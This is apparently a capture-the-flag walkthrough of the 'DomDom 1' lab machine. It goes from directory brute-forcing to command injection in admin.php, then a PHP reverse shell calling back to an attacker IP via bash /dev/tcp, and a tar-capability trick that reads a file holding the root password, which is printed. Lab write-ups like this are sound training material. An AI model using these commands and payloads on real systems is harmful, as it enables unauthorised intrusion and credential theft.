## DomDom 1

### 1. Enumeration & Reconnaissance

The assessment began with directory brute-forcing using **dirsearch** to identify hidden files and endpoints.

```bash
dirsearch -u http://192.168.56.111:80/ -t 200

```

**Key Discovery:**

* **`/admin.php`**: Returned a HTTP 200 status code, indicating a potentially accessible administrative interface.

---

### 2. Exploitation (Initial Access)

By intercepting a login request to `index.php` using **Burp Suite**, the request was modified to target `admin.php`. The server's response revealed an HTML form with a command execution input field (`name="cmd"`).

#### Remote Code Execution (RCE)

To verify the vulnerability, the `id` command was injected into the POST request:

**Request:**

```http
POST /admin.php HTTP/1.1
...
name=avrahamcohen.ac@gmail.com&username=avrahamcohen.ac@gmail.com&password=admin&access=access&cmd=id

```

**Response:**
The server executed the command and returned the output within `<pre>` tags, confirming **Remote Code Execution**.

---

### 3. Establishing a Reverse Shell

To obtain a more stable interactive environment, a PHP reverse shell script (`rev.php`) was prepared:

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.56.102/1234 0>&1'");
?>

```

1. **Delivery**: A local Python HTTP server was started on the attacker's machine (`python -m http.server 8088`).
2. **Download**: The target was commanded to download the shell via the RCE vulnerability:
`wget http://192.168.56.102:8088/rev.php`
3. **Execution**: After verifying the file presence with `ls`, permissions were set to `777` (`chmod 777 rev.php`).
4. **Connection**: A listener was started on the attacker machine (`nc -lnvp 1234`). Upon accessing `rev.php` via the browser, a shell was granted as the `www-data` user.

---

### 4. Privilege Escalation

#### Identification of Linux Capabilities

A search for binaries with special capabilities was conducted:

```bash
getcap -r / 2>/dev/null

```

The scan identified an insecure capability assigned to the `tar` binary:
**`/bin/tar = cap_dac_read_search+ep`**

> #### **Theory: Linux Capabilities and Exploitation**
> 
> 
> Historically, Linux security was a binary choice: either a process was **Root** (all privileges) or a **User** (no privileges). **Linux Capabilities** were introduced to break down root privileges into smaller, granular pieces.
> In this case, the binary `/bin/tar` was granted **`cap_dac_read_search`**.
> * **DAC** (Discretionary Access Control) refers to the standard Permission/Ownership model (Read/Write/Execute).
> * **`cap_dac_read_search`** allows a process to bypass file read permission checks and directory search/execute checks.
> 
> 
> **The Vulnerability**: Since `tar` has this capability, it can read any file on the system, regardless of who owns it. An attacker can use `tar` to create an archive of a sensitive file (like `/etc/shadow` or a private user file) and then extract it to a location they control. Upon extraction, the attacker becomes the owner of the copy, effectively bypassing all file system security.

#### Exploiting `cap_dac_read_search`

Attempts to read `/home/domom/Desktop/README.md` directly resulted in "Permission denied." However, using the privileged `tar` binary:

1. **Archiving the secret**: `tar -cvf readme.tar /home/domom/Desktop/README.md`
2. **Extracting in `/tmp**`: `tar -xvf readme.tar`
3. **Reading the content**: `cat home/domom/Desktop/README.md`

The file contained the root password: **`Mj7AGmPR-m&Vf>Ry{}LJRBS5nc+*V.#a`**

---

### 5. Conclusion (Full Root Access)

Using the discovered credentials, an interactive TTY shell was spawned via Python, and the user switched to the root account.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo su
# Password: Mj7AGmPR-m&Vf>Ry{}LJRBS5nc+*V.#a

```

**Final status:** Full system compromise achieved.